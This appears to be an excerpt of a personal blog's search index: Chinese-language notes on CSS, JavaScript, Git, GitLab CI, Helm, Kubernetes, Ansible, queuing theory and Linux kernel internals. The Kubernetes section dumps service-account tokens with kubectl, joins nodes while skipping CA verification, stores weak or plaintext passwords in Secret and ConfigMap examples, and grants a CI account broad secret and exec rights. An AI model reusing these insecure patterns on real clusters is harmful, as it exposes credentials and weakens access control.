Guide\n","categories":["System","Small project","OS"]},{"title":"css的context","url":"/2022/01/css-ctx/","content":"動機\n寫個簡單的筆記\n\ntree的node: box(element)\nbox就是每個element，有各自的width, margin, padding\n\n但有block與inline讓margin的計算方式不同\n\ntree root: Formatting Context\n決定裡面的node怎麼顯示在畫面上排版\nblock Formatting Context\n最一般的FC，就是把block element從上往下一直塞\ninline塞成一行，這一行當成block\n產生條件\n\n根元素或其它包含它的元素\n浮動 float: left/right/inherit\n絕對定位元素 position: absolute/fixed\n行內塊 display: inline-block\n表格單元格 display: table-cell\n表格標題 display: table-caption\n溢出元素 overflow: hidden/scroll/auto/inherit\n彈性盒子 display: flex/inline-flex\n\nFlex Formatting Contexts\n\n\ngrid: display: grid\n\nGrid Formatting Contexts\n\n\n\n性質\n因為這是tree的根，所以會有一些有趣的性質\nMargin Collapsing\n在同一個BFC下，會把下面的box的top-margin吃掉\n\n發生在\n\n第一個與最後一個child\n兄弟\n\n其實就是讓margin盡量靠近當初設定的\n如果在同一個context下，都還保持各自的margin，這樣margin會超長，所以可以取一個做代表就好\nreflow\n如果dom被動過(js之類的)，這樣要重新排版，這叫reflow\n但只有在同一棵tree下在的才會被影響(同一個context)，所以可以利用生不同context把reflow的範圍變小，加快reflow的速度\nvisibility &amp; display\n\nvisibility\n\n看不看的到\n\n會被reflow，但不會被repaint\n\n\n\n\ndisplay\n\n決定要怎麼排版(Formatting Contexts)\n\ndisplay: none就是連reflow都不會\n\n\n\n\n\nInline Formatting Contexts\n可以算是Block Formatting Contexts的特例\n就Block Formatting Contexts只有inline element\nstacking context\n前面看過了兩種tree，主要是對平面做排版\n那三維就是每個tree的平面中切出好幾個level，之後就可以把tree的node指定到各個level去\n這個level叫z-index\n如果都在同一個level\n\nRef\ncss布局的各种FC简单介绍：BFC，IFC，GFC，FFC\n話說 stacking context 是什麼呢？\n","categories":["CSS","FAQ"]},{"title":"在javascript做deep copy?","url":"/2022/01/deep-copy-in-javascript/","content":"動機\n當你以為deep copy是正常的builtin時，Javascript總是能給你驚喜\n\n當初我以為\n\nObject其實是hash table，所以拿來放function key很合理(又都是指到同一個function)\n\n\n用console.log看的到\n\n\nhash table如果被deep copy應該要對key, values做deep copy\ndeep copy是基本功能\n\n實際上\n\n沒有deep copy\n\n\ngoogle後大部分會說用JSON.stringify\n\n\n用Object.entries不會出現function key\n\n\nconsole.log不是有出現嗎!?\n\n\nfunction key不會出現在JSON.stringify中!!\n\n\n用Object.assign(&#123;&#125;,obj)之類的，可以處理function key\n\n\nObject.assign(&#123;&#125;,obj)不會deepcopy!! (shallow copy)\n\n\nstructuredClone但要看版本，夠新才會有，polyfill的可能有毛病\n\n\n用套件lodash - cloneDeep\n\n","categories":["Javascript","Tips"]},{"title":"git rebase","url":"/2022/01/git-rebase/","content":"動機\n常用，紀錄一下\n\n一般版\n原本merge是產生一個merge commit\nrebase是把每個commit搬到要被merge的branch\n互動版\n修commit用\ns,f: 合併commit f可以把被吃的commit msg忽略掉\ne: 停下來改 (可以用來分割commit，搭配reset)\nd: 把commit拿掉\n從branch的頭開始\ngit rebase -i --root master\n","categories":["Utils","Git"]},{"title":"gitlab ci的yaml小tips","url":"/2022/01/gitlab-ci-yaml-tips/","content":"動機\n寫的時候有遇到坑，紀錄一下\n\nextend的script\nextend可以當成會block整個蓋掉\n所以要就是用reference(gitlab要夠新)，不然就是把code直接copy過去\nAppend the script on one stage .gitlab-ci.yml\ninclude的file同時再include同一個file\n要加root，讓gitlab誤以為是不同的路徑\n# a.yamlinclude:  - project: username/repo    ref: master    file: /utils.yml# b.yamlinclude:  - project: username/repo    ref: master    file: //utils.yml\nissue\nyaml中多行\n- &gt;是會把斷行吃掉的\n如果要放script要用- |\n.job1:  image: python:3-alpine  script:    - pip3 install pyyaml    - |        cat &lt;&lt; END &gt;&gt; hi.py        #!/usr/bin/env python3        print(&quot;hi&quot;)        END    - python3 hi.py","categories":["Utils","CI","Gitlab CI"]},{"title":"helm tutorial","url":"/2022/01/helm-tutorial/","content":"動機\n文件寫得不錯，很好懂\n\n大概過程\ntemplate被compile成yaml，之後就kubectl apply -f\n結構\ntemplates就是yaml的template\nvalue.yml就是放各種資料，用\n&#123;&#123; .parent.item &#125;&#125;\n拿\nChart.yml這個helm的訊息\nCharts管其他dependencies from 其他chart\n語法\n取值\n&#123;&#123; .Values.&lt;item&gt; &#125;&#125;\n.就是root，後面就是很像物件調用方法，至於有什麼物件看這裡\n變數\n&#123;&#123;- $relname := .Release.Name -&#125;&#125;&#123;&#123;- range $key, $val := .Values.favorite &#125;&#125;\npipeline\n&#123;&#123; f a &#125;&#125;// 變成&#123;&#123; a | f &#125;&#125;\n消滅空行\n&#123;&#123; if eq .Values.favorite.drink &quot;coffee&quot; &#125;&#125;    mug: &quot;true&quot;&#123;&#123; end &#125;&#125;\n會輸出\nmug: &quot;true&quot;\n不是不行，但能不能把if的空行消滅掉\n&#123;&#123;- if eq .Values.favorite.drink &quot;coffee&quot; &#125;&#125;    mug: &quot;true&quot;&#123;&#123;- end &#125;&#125;\n會輸出\nmug: &quot;true&quot;\n不要在block中縮排\n&#123;&#123;- if .... &#125;&#125;    xyz: 123&#123;&#123;- end &#125;&#125;&#123;&#123;- if .... &#125;&#125;abc: 123&#123;&#123;- end &#125;&#125;\n變成\n    xyz: 123abc: 123\nchroot\n原本\ndrink: &#123;&#123; .Values.favorite.drink | default &quot;tea&quot; | quote &#125;&#125;food: &#123;&#123; .Values.favorite.food | upper | quote &#125;&#125;release: &#123;&#123; .Values.favorite.Release.Name &#125;&#125;\n變成\n用$來拿到with外面的root (話是說上一層)\n&#123;&#123;- with .Values.favorite &#125;&#125;drink: &#123;&#123; .drink | default &quot;tea&quot; | quote &#125;&#125;food: &#123;&#123; .food | upper | quote &#125;&#125;release: &#123;&#123; $.Release.Name &#125;&#125;&#123;&#123;- end &#125;&#125;\nloop\n&#123;&#123;- range .Values.pizzaToppings &#125;&#125;- &#123;&#123; . | title | quote &#125;&#125;&#123;&#123;- end &#125;&#125;  \n抽象yaml\n&#123;&#123;- define &quot;mychart.labels&quot; &#125;&#125;  labels:    generator: helm    date: &#123;&#123; now | htmlDate &#125;&#125;&#123;&#123;- end &#125;&#125;metadata:  name: &#123;&#123; .Release.Name &#125;&#125;-configmap  &#123;&#123;- template &quot;mychart.labels&quot; . &#125;&#125; // 要記得把想要root傳進去\n變成\nmetadata:  name: &#123;&#123; .Release.Name &#125;&#125;-configmap  labels:    generator: helm    date: &#123;&#123; now | htmlDate &#125;&#125;\n用include可以控制縮排\n&#123;&#123;- define &quot;mychart.labels&quot; &#125;&#125;  labels:    generator: helm    date: &#123;&#123; now | htmlDate &#125;&#125;&#123;&#123;- end &#125;&#125;metadata:  name: &#123;&#123; .Release.Name &#125;&#125;-configmap&#123;&#123;- include &quot;mychart.labels&quot; | indent 4 &#125;&#125;\n變成\nmetadata:  name: &#123;&#123; .Release.Name &#125;&#125;-configmap  labels:    generator: helm    date: &#123;&#123; now | htmlDate &#125;&#125;\nlocal install\nhelm pull &lt;repo&gt;/&lt;name&gt;會拉tar回來，name-ver.tar\nhelm可以install by\n\ntar\nfolder\n但要指定完整檔名，所以如果都拉最新版，tar的ver會無法確認\n\n所以要先untar，他untar後只會有名字\nhelm pull &lt;repo&gt;/&lt;name&gt; --untar\n之後就可以直接指定folder name安裝\nHow to debug\n把生了什麼印出來\nhelm install --dry-run --disable-openapi-validation &lt;name&gt; ./mycharthelm template .\nAPI\n能用的函數在Go template language與Sprig template library\n其他有用的\nYAML Techniques\nDebugging Templates\nChart Hooks\n","categories":["Docker","Tips"]},{"title":"k8s概念","url":"/2022/01/k8s-concepts/","content":"動機\n可以先去看k8s筆記\n\nk8s cluster &amp; namespace\n\nnamespace == virtual cluster\n\ncluster = master + workers\n\n\n\nk8s Volume\n\n\nStorageClass\n\na set of disk partitions (a physical disk)\n\nprovisioner (What is this disk?)\n\nparameters\n\n\n\n\n=&gt; PersistentVolume\n\na disk partition\n=&gt; PersistentVolumeClaim\n\na folder with some limitation\n\nsize\nWhat should k8s do when this pod has been deleted?\n\n\n\n\n\n\n\n\n\ncommon arguments\n\nreclaimPolicy\naccessModes\n\n\n\nk8s components\n\nConfigMap &amp; Secret\n\ndict (key-value)\ndict[key] = value\n\nSerect will encrypt!!\nConfigMap will not\n\n\ndict[key]\n\nvalueFrom\n\nconfigMapKeyRef or secretKeyRef\n\nname\nkey\n\n\n\n\n\n\n\n\nDaemonSet\n\nrun pods on each nodes\n\npods are daemons for a node\n\n\n每個Pods都會共用同一個掛載硬碟\nno rollback\n更新方面，DaemonSet更新方式為一個Pod先關閉，而後才起新的Pod\n\n\nStatefulSets\n\npod有唯一編號\n使用PVC時，會有各自獨立的Storage\n佈署與擴展時，每個 pod 的產生都是有其順序且逐一完成\nno rollback\n\n\nJob\n\npods will be cleaned up after pods’ tasks have finished\n\n\nIngress &amp; Service\n\nIngress: reverse proxy (url to service)\nService: port forward &amp; DNS (url)\n\nLoadBalancer\n\nrouting (like reverse proxy, ip&amp;port to pods)\n\n\nNodePort\n\nport forward\n\n\n\n\n\n\nDeployment\n\n-&gt; ReplicaSet -&gt; Pod\nHealth Check\nRollback\n每個Pods都會共用同一個掛載硬碟\n\n\n\nk8s components management\n\nhow to find a component fulfilling requests?\n\nkind\n\nother arguments\n\n\nlabel\n\nkey:value\n\n\nnamespace\n\n\nselector\n\nkey: value\n\n\n\nchain\nservice -&gt; deployment(s) (with configmap) -&gt; service -&gt; …\nk8s &amp; Istio (define how to connect to pods!!)\n\nk8s:\n\nproxy on Node\n\ndispatch(by iptables) to pods in this Node\n\n\n\n\nistio\n\nproxy on Service (in each pod)\n\nlike Ingress, but\n\nproxy control pods directly\n可以實現內對外的gateway ()\n\n\n\n\n\n\n\n這裡可以順便嘴一下，k8s的pod創完後就不能加pod，所以如果conntainer出事沒辦法插入probe，這樣與kprobe有什麼不一樣(所以才有像是istio之類的東西出現)\nissue\nhelm\n\nyaml compiler &amp; dict manager (control content by some conditions)\n\nwith\n\nsome artifacts (reuse others’ yaml)\nDSL (no!!)\n\n\n\n\n\nk8s’s device plugin\n\n就是driver in traditional OS\n用法就是把device mount到對應的path (/dev/xxx)\n\nInterface\n\nContainer Runtime Interface (CRI) (k8s&amp;istio , docker&amp;containerd)\n\nPod Life Cycle (Add/Delete)\nPod Status\nImage management\nContainer Operations (attatch/exec)\n\n\nContainer Network Interface (CNI)\n\n上網能力，通常都會希望能夠有連接外網的能力\n\nmutilcast\n硬體加速 (DPDK,…)\n\n但k8s的proxy與相關功能(service discovery)都是走linux network stack!!\nCNI要重新實現k8s的proxy與相關功能!!\n\n\n\n\n分配 IP 地址，幫每個 Pod 找一個獨立不重複的 IP\nNetwork Policy， kubernetes 內部有 Network Policy 去限制 Pod 與 Pod 之間的網路傳輸\n\n\nContainer Storage Interface(CSI)\n\n支援動態配置或是靜態配置\n\n其實對應到 k8s 就是 storageclass 以及 PersistentVolume 的概念\n\n\n支援Attach，該 Node 有能力可以跟該儲存方案連接起來\n支援Mount，該儲存空間給實體化後可以透過 Filesystem 去存取。\n支援 Block Device (EBS) 或是可直接 Mountable Volumes (大家應該大部分都用這個)\n支援本地儲存設備解決方案，譬如 (device mapper, lvm)，這些又是以前的儲存議題了\n支援創建/刪除快照\n可提供從先前創造的快照復原出任何空間\n\n\n\n   CreateVolume +------------+ DeleteVolume +-------------&gt;|  CREATED   +--------------+ |              +---+----+---+              | |       Controller |    | Controller       v+++         Publish |    | Unpublish       +++|X|          Volume |    | Volume          | |+-+             +---v----+---+             +-+                | NODE_READY |                +---+----^---+               Node |    | Node              Stage |    | Unstage             Volume |    | Volume                +---v----+---+                |  VOL_READY |                +------------+               Node |    | Node            Publish |    | Unpublish             Volume |    | Volume                +---v----+---+                | PUBLISHED  |                +------------+\n\nrdac\nRole, ClusterRole 就是能使用什麼資源\nRoleBinding就是把Role連到User或是ServiceAccount\n這樣pod就能根據rbac的規定去操作k8s的資源，是根據餵到master的token去查權限\nkubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep ACCOUNT | awk &#x27;&#123;print $1&#125;&#x27;)\n下面是針對gitlab ci runner的rbac\nkind: ServiceAccountapiVersion: v1metadata:  name: ci  namespace: ci---kind: ClusterRoleapiVersion: rbac.authorization.k8s.io/v1metadata:  name: cirules:- apiGroups: [&quot;&quot;]  resources: [&quot;pods&quot;]  verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;patch&quot;,&quot;delete&quot;]- apiGroups: [&quot;&quot;]  resources: [&quot;pods/binding&quot;]  verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;]- apiGroups: [&quot;&quot;]  resources: [&quot;pods/log&quot;]  verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;]- apiGroups: [&quot;&quot;]  resources: [&quot;pods/status&quot;]  verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;patch&quot;]- apiGroups: [&quot;apps&quot;]  resources: [&quot;deployments&quot;]  verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;patch&quot;]- apiGroups: [&quot;apps&quot;]  resources: [&quot;replicasets&quot;]  verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;patch&quot;]- apiGroups: [&quot;&quot;]  resources: [&quot;secrets&quot;]  verbs: [&quot;list&quot;, &quot;get&quot;, &quot;create&quot;, &quot;delete&quot;, &quot;update&quot;]      - apiGroups: [&quot;&quot;]  resources: [&quot;configmaps&quot;]  verbs: [&quot;list&quot;, &quot;get&quot;, &quot;create&quot;, &quot;delete&quot;, &quot;update&quot;]- apiGroups: [&quot;&quot;]  resources: [&quot;pods/exec&quot;]  verbs: [&quot;create&quot;]- apiGroups: [&quot;&quot;]  resources: [&quot;pods/attach&quot;]  verbs: [&quot;list&quot;, &quot;get&quot;, &quot;create&quot;, &quot;delete&quot;, &quot;update&quot;]---kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: cisubjects:- kind: ServiceAccount  name: ci  namespace: ciroleRef:  kind: ClusterRole  name: ci  apiGroup: rbac.authorization.k8s.io---kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: ci-defaultsubjects:- kind: ServiceAccount  name: default  namespace: ciroleRef:  kind: ClusterRole  name: ci  apiGroup: rbac.authorization.k8s.io\n多nodes\n\n創master: kubeadm init\n拿master的token: kubeadm token list\njoin: kubeadm join --discovery-token-unsafe-skip-ca-verification --token=TOKEN MASTER_IP:6443\n\nkubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk &#x27;&#123;print $1&#125;&#x27;)\n範例\n下面是用Secret, ConfigMap, Service, Deployment\n簡單創一個DB\napiVersion: v1kind: Secretmetadata:  name: postgres-secrettype: Opaquedata:  POSTGRES_PASSWORD: MTIzNDU2Nzg5Cg==---apiVersion: v1kind: ConfigMapmetadata:  name: postgres-config  labels:    app: postgresdata:  POSTGRES_COMMON: pg2  POSTGRES_PASSWORD: &quot;123456789&quot;---apiVersion: v1kind: PersistentVolumemetadata:  name: postgres-pv-volume  labels:    type: local    app: postgresspec:  storageClassName: manual  capacity:    storage: 5Gi  accessModes:    - ReadWriteMany  hostPath:    path: &quot;/mnt/data&quot;---apiVersion: v1kind: PersistentVolumeClaimmetadata:  name: postgres-pv-claim  labels:    app: postgresspec:  storageClassName: manual  accessModes:    - ReadWriteMany  resources:    requests:      storage: 1Gi---apiVersion: apps/v1kind: Deploymentmetadata:  name: postgresspec:  replicas: 1  selector:    matchLabels:      app: postgres  template:    metadata:      labels:        app: postgres    spec:      containers:        - name: postgres          image: postgres:12.9-alpine          imagePullPolicy: &quot;IfNotPresent&quot;          ports:            - containerPort: 5432          env:            - name: POSTGRES_DB              valueFrom:                configMapKeyRef:                  name: postgres-config                  key: POSTGRES_COMMON            - name: POSTGRES_USER              valueFrom:                configMapKeyRef:                  name: postgres-config                  key: POSTGRES_COMMON            - name: POSTGRES_PASSWORD              valueFrom:                secretKeyRef:                  name: postgres-secret                  key: POSTGRES_PASSWORD          volumeMounts:            - mountPath: /var/lib/postgresql/data              name: postgredb      volumes:        - name: postgredb          persistentVolumeClaim:            claimName: postgres-pv-claim---apiVersion: v1kind: Servicemetadata:  name: postgres  labels:    app: postgresspec:  type: NodePort  ports:   - port: 5432  selector:   app: postgres\nsecret as files\napiVersion: v1kind: Secretmetadata:  name: test-secrettype: Opaquedata:  username: YWRtaW4=  password: YTYyZmpiZDM3OTQyZGNz\nspec:  volumes:  - name: secret-volume    secret:      secretName: test-secret  containers:    - name: test-container      image: alpine:latest      command: [&quot;sleep&quot;, &quot;9999&quot;]      volumeMounts:          - name: secret-volume            mountPath: /etc/secret-volume\n這樣在/etc/secret-volume/username就能直接cat出username\nkubectl exec shell-demo -- cat /etc/secret-volume/username\nkubectl exec -it my-pod main-app -- /bin/bash\nRef\n\n","categories":["Docker","FAQ"]},{"title":"只讀一部份的yaml成ansible的變數","url":"/2022/01/part-of-yaml-into-ansible/","content":"動機\n有2種辦法\n\n\nyq + trim\n\n有點偏bash流\n- name: Read yaml  shell: &quot;cat values.yaml | yq e -o=j &#x27;.tag&#x27; -&quot;  register: tag- name: Parse tag  set_fact:    tag: &quot;&#123;&#123; tag.stdout | trim &#125;&#125;&quot;\n\nfrom_yaml\n\n- name: Read yaml  shell: &quot;cat values.yaml&quot;  register: tag- name: Parse tag  set_fact:    tag: &quot;&#123;&#123; (tag.stdout | from_yaml)[&#x27;tag&#x27;] &#125;&#125;&quot;","categories":["Utils","Ansible"]},{"title":"queuing thoery的tutorial","url":"/2022/01/queuing-thoery/","content":"動機\n補完當年的queuing thoery\n\n一言以蔽之，這到底在幹嘛\n\n替queue建模\n用random variable說話(設計每個queue的部分)\n\n其實queuing thoery應該要另外開一堂專門介紹怎麼操作random variable才對\n\n\n\n複習機率\nRandom variable到底是什麼\n高級的random，可以生出對應的output。\n可以把Random variable當成疊加態，等到去用時才會確定一個值，所以可以對這個RV算機率、期望值等等性質\n連續與離散\n連續與離散就是看這個高級的random丟出來的值的range是可數還是不可數\n同時連續與離散的RV也有不同的術語\n\n連續\n\nCumulative Distribution Function\n\npdf的積分，可以得到小於等於某個值的機率\n\n\nProbability density function\n\ncdf的微分，就是圖上的那條線 (不是機率!!)\n\n因為pdf的output可能超過1\n\nPDF is not a probability.\n\n\n\n\n\n\n\n\n離散\n\nprobability mass function\n\n就是機率\n\n\nCumulative Distribution Function\n\npmf的總和，可以得到小於等於某個值的機率\n\n\n\n\n\n期望數 &amp; 變異數\n\n期望數: output與pdf/pmf的加權總合\n\nE(aY+bX) = aE(Y) + bE(X)\nE(g(X)) = sum(g(x)*pmf_or_pdf(x))\n\n這個很重要，之後會對X上一堆函數，需要這個才知道發生什麼事\n\n\n如果有獨立的話，E(X &amp; Y) = E(X) * E(Y)\n\n這個也很重要\n\n\n\n\n變異數: output與期望數的差距平方 (就是懶得算sqrt)\n\n標準差: 給變異數上sqrt\n\n\n\nconditional probability\n就是重新取scope，在Y中X的機率，所以把分母改成Y，分子改成X&amp;Y\nP(X | Y) = P(X &amp; Y) / P(Y)\n配合獨立，P(X | Y) = P(X)\n貝氏: P(X | Y) = P(Y | X) * (P(X) / P(Y))\nX與Y的and可以透過條件機率換出來，P(X | Y) * P(Y) = P(X &amp; Y) = P(Y | X) * P(X)\nConditional Independence\n就是在這個scope中兩RV是獨立的，但沒這個scope，它們不一定獨立\nP(X &amp; Y | Z) = P(X | Z) * P(Y | Z)\nConditional Independence — The Backbone of Bayesian Networks\n新Random variable的推導\nPoisson Distribution\n詳細推導可以看這邊Poisson Distribution — Intuition, Examples, and Derivation\n如果想知道\n\ntry n次 時\n某事件 成功/失敗 的機率\n\n可以用二項式分布，但是\n\n我們要知道次數\n只能看 成功/失敗 的機率 (可以把成功當成事件發生的機率)\n\n然而更多時候我們只知道某一段時間中的事件發生的平均值而已\n所以需要把二項式分布改造一下\n把事件發生的機率還原成事件發生的平均值 / 總次數\n接著把n拉到無限大，當成做很多次實驗\n\n之後處理前面那一坨\n\n所以Poisson Distribution就是n拉到無限大的結果，這樣也讓他有一些使用上的假設\n\n每個單位時間的事件發生的機率都是一樣的\n事件是獨立的\n\nExponential Distribution\n詳細推導可以看這邊Exponential Distribution — Intuition, Derivation, and Applications\n現在想要看從一個事件發生後，要多久才會有下一個事件\n如果沿用Poisson Distribution就是看分布之間的機率\nhow?\n事件發生後，要多久才會有下一個事件，也就是沒事件的時間有多久，所以把Poisson Distribution帶0\n\n但是Poisson Distribution看的是每個單位時間，但我們需要的是一段時間\n一次不夠，可以乘好幾次(獨立)，e^(-λt)\n這樣是在t後開始出現下一次事件的機率，in math\nP(T &gt; t) = e^(-λt)\n注意到這裡的時間默默變成RV了\n之後就是用機率的終極定理，機率加總等於1\n只要用1去減，就可以得出cdf，之後微分就是pdf\nmemoryless\nP(T &gt; a + b | T &gt; a) = P(T &gt; b)\n\n\nPoisson Process\nprocess其實就是RV多加一個time的參數，所以公式與exp dist很像，但是可以指定某時間區段中發生k次\n\n怎麼推導新的Random variable\n詳細推導可以看這邊Sum of Exponential Random Variables\n利用獨立與Marginal distribution (就像是對其中一個RV做微分)\n下面是兩個exp dist相加的cdf\n\n之後就可以求pdf\n\n這就是Erlang distribution\nqueuing model\n怎麼叫queue\nqueue長這樣\n\n有這些元素 (會給的與要算的)\n\nn是數量，分成在queue與在server\nw是waiting time\ns是service time\nr是residual time (sojourn time, response time)，在整個系統中的逗留時間\nλ(速度)\nµ是service的rate(速度)\n把queue的特性寫下來\n\n接下去?\n做下面3件事\n\n對每個部位用不同的Random variable去描述\n把queue的東西換一換\n組合1與2\n\n之後看怎麼把他們組合在一起\n通常有兩個觀察者\n\nglobal (time)\nuser\n\nRandom variable有自己的特性，每個queue model也有自己的特性\n不要搞混，不論何時都要想到現在探討的東西與queue之間的意義\nclassic queue model\n適用於所有queue的law G/G/m\n\nStability Condition: λ &lt; m*µ\nLittle’s law: n_queue = λ * 平均waiting_time\n\nn = λ * 平均response_time\n\n\n\nm/m/1\n\n\nPoisson arrivals (λ)\nExponential service times (µ)\n1 server\n無限buffer\nFIFO\n\n在這個時候system有多少人\n從N(t) → N(t + ∆t)會有3種case\n\n1 arrival\n\nλ∆t\n\n\n1 service\n\nµ∆t\n\n\nno arrival, no service\n\n1 − (λ + µ)∆t\n\n\n\nin math\n\n\n\n\n\n\n\nSteady-state analysis: 如果把t設成無限大(微掉t)?\n\n把Chapman Kolmogorov equation調成微掉t\n\n\n解偏微分 (列遞迴加總等於1)\n\n\nstable\nλ &lt; m*µ m帶1\n所以λ/µ(這邊叫ρ, traffic intensity or load)要小於1\n\n一些元素\n\n\n\n\nMarkov Chains\nDiscrete-time Markov Chains\nMarkov Chains的重點是只依據目前的狀態轉到下一個狀態\n\n寫成matrix\n\n在這個時候system有多少人\n兩個版本，一個算式版，一個matrix版\n\n\nSteady-state analysis : 把n去掉\n先是算式版\n\n把上螢光的部分丟到左邊去\n\n另一個matrix版\n\n總input == 總output\n\n\nergodicity: a unique positive steady-state distribution\nergodicity 中文叫遍歷性，不管系統的初始狀態如何，在經歷了一段時間以後，系統就會處於統計平衡狀態\n有三個條件\n\n\nirreducible: From any state, it is possible to get to any state\n\n整個圖是個SC，不管從哪邊開始，都可以走到graph的任意一點\n\n沒有的話\n\nlose positivity, and possibly uniqueness, of the steady-state distribution\n\n\n\n\n\npositive recurrent: The expected return time to any state is finite\n\n應該叫deterministic\n\ngraoh的node的量是有限的\n沒有負環\n\n\n\n沒有的話\n\n這樣有些state無法到達穩定 (就是unstable)\n\n\n\n\n\nAperiodicity: There is no T ≥ 2 such that paths from a state to itself can only take multiples of T steps\n\n可以把no T ≥ 2換成T &lt; 2，也就是最多一步\n\n從自己到自己最多只有1步\n如果有period在，這樣在算這一點的機率時\n\n在自己的點，可以產生無限多條從自己開始的path，這樣就不用算了\n\n\n\n\n\n沒有的話\n\n這樣在算state時會看到\n\nP_ii * P_ii的詭異畫面\n\n\n\n\n\n\n\nContinuous-time Markov Chains\n定義\n\n大概長這樣\n\n同樣的事件轉移機率，同樣的從system中i人，變成j人\n不同的是現在是看arrival與service done(departure)誰先發生\n\n寫成matrix\n這裡定義了新東西: Transition rates\n為了符合當初的機率加總等於1，所以把自己到自己設成-λ\n\n\n在這個時候，system在什麼狀態\n\nSteady-state analysis : 把t去掉\n\n總input == 總output\n\n特化的例子: Birth-death processes\n只有兩個方向，往前或往後\n\nLocal balance == global balance equations\n\n\nSpecial matrix: Triangular system\n\nStationary distribution\n\n例子: M/M/1 queue with balking\n看到有人可能client就直接走人\n\nStationary distribution\n\n例子: M/M/1/K\n\n\nStationary distribution\n\nLoss probability &amp; Blocking probability &amp; Ergodic\n\nBlocking probability: 是在t時刻整個system已經滿了\n\n剛好等於整個system處於滿的時間總和對上觀察區間的比值\n\n\n\n\n\n\nLoss probability: 是在client到system時整個system已經滿了\n\n之後有一個特性是描述這兩個可以是等於的!!\n\nErgodic theorem\n\n遍歷性\n\n表現出來會是: 從時間上觀察，與從user的角度觀察，結果是一樣的\n\n時間均值等於空間均值\n例如要得出一個城市A、B兩座公園哪一個更受歡迎，有兩種辦法\n\n第一種辦法是在一定的時間段考察兩個公園的人數，人數多的為更受歡迎公園\n第二種辦法，隨機選擇一名市民，跟蹤足夠長的時間來統計他去兩個公園的次數，去得多的為更受歡迎公園\n\n\n\n\n\n\n\n\n\n\n因為現在client是Poisson process，所以可以用Poisson Arrivals See Time Averages，其實就是遍歷性\n\n這樣就可以用前面的Stationary distribution直接求Loss probability\n\nMulti-server systems\nM/M/C/C: Pure-Loss System\n長這樣\n\nuser不會retry\n狀態圖\n\n同時開C台server，所以service的RV是Exp(k*µ)，k是看現在有多少台正在跑\nSteady-State Distribution\n\nBlocking Probability a.k.a Erlang-B\nSteady-State Distribution帶C 與 PASTA\n\nM/M/C/∞: Waiting System\n長這樣\n\n現在有queue了!!\nStability: ρ &lt; C\n狀態圖\n\nSteady-State Distribution\n\nwaiting probability a.k.a Erlang-C\nSteady-State Distribution帶C 與 PASTA\n\n一些元素\nSteady-State Distribution 與 little law導平均有多少人在system\n\n之後，把service time與waiting time相加就是residual time\n注意這裡的service time只有一台server\n\nmulti-cpu 與 multi-core\n\nRef\nQueuing Theory: from Markov Chains to Multi-Server Systems\n","categories":["System","Performance"]},{"title":"奔跑吧linux內核ch2~ch5摘錄","url":"/2022/01/running-linux-parts/","content":"動機\n當初看這本是想補完一些linux kernel的設計實做，但最後發現除了第一章之外，都是code加直譯code的中文…\n這樣與自己trace有什麼區別!?\ncode只是設計的其中一種體現\n書的重點應該是介紹設計，再加上一些比較特別或是重要的code\n所以後面就改成挑經典概念(不同於xv6)的解釋\nch4是說lock的實做，所以挑RCU來說\nch5是說中斷的，可以參考linux kernel development與xv6的pdf\nch6是怎麼debug像ftrace與debugfs、systemtap、kasan、kmemleak、CONFIG_DEBUG_LOOKDEP\n\npage: buddy\n原本在xv6是直接從freelist拿一個page，但這樣一直alloc與free，會讓連續的page變少\n所以buddy就是先設定好一定大小的page，組成block，之後就是從對應的長度取\n如果差一點點，就是把剩下的丟到對應的長度，例\n3 pages從拿一塊，剩下1page放到\n\nobject: slab\n一次拿一個page真的很大，很多時候只要放struct而已，所以有了slab\n給定struct大小，之後裡面切成3個list，剩下就與freelist很像，但是單位是struct大小\n\nfull: page被占滿\npartial: 有空的、有被用的\nfree: 都空的\n\n\n想知道slab的訊息可以參考這裡\nrmap\n我們有mmap，把va對到pa\nrmap就是讓pa知道有多少va對到他，這樣就能從pa做unmap了\nkswapd就會用到rmap，另外在memory compact做memory migrate(把page移到另一個process)也會用到rmap\ngc: kswapd\nkswapd就是負責回收page(像是slab的page)的kernel process\n基本上觸發條件與gc差不多\n\n週期性\n當碰到zone(linux描述mem的資料結構)的low watermark\n\n為什麼我們要free?\n因為kernel沒有辦法確認這mem還有沒有人要用到。\nptr其實就是整數，但kernel不知道這塊mem是不是有人指到。\n這樣就乾脆讓user自己管理就好。\n但是現在大部分語言都會把object抽象出來，這樣就能利用object本身的struct紀錄使用情況，來做gc\nmemory compact\nbuddy可以降低fragmentation的衝擊，但最後一定會有，所以還是要處理\n所以才有memory compact，基本上就是一邊找可以移動的page，一邊找空的page，之後migrate\n\n詳細可以看這邊\nkernel same page\n把page當成key，做比對，之後遇到一樣的page就能共用\n像是開了許多linux vm這樣應該有一些page的內容會是一樣的\n\nOOM\nmalloc是申請(commit)，說有這一塊可以用(看xv6 lazy allocation與cow)\n但通常user不會剛好把申請全部用完，這樣其實很浪費\n所以linux認可某種程度上的overcommit\n可以用/proc/sys/vm/overcommit_memory調overcommit的行為\n如果真的pa都沒了，連kernel的free都給完了，oom killer就會出現，找一個proc下手\n可以透過/proc/&lt;pid&gt;/oom_score調oom分數，讓killer盡量不會對某些proc下手\nRCU\nRCU就是不用lock做出來的的rwlock\nRCU可以當成一個ptr的buffer\nupdater做好修改後，synchronize_rcu會等其他reader讀完\n之後就會把新的ptr丟出去，最後把舊的回收掉\nvoid foo_read(void) {    rcu_read_lock();    foo *fp = global_foo;    if (fp)        do_something(fp-&gt;a, fp-&gt;b, fp-&gt;c);    rcu_read_unlock();} void foo_update(foo *new_fp) {    spin_lock(&amp;foo_mutex);    foo *old_fp = global_foo;    global_foo = new_fp;    spin_unlock(&amp;foo_mutex);    synchronize_rcu();    kfree(old_fp);}\n\n\ncfs 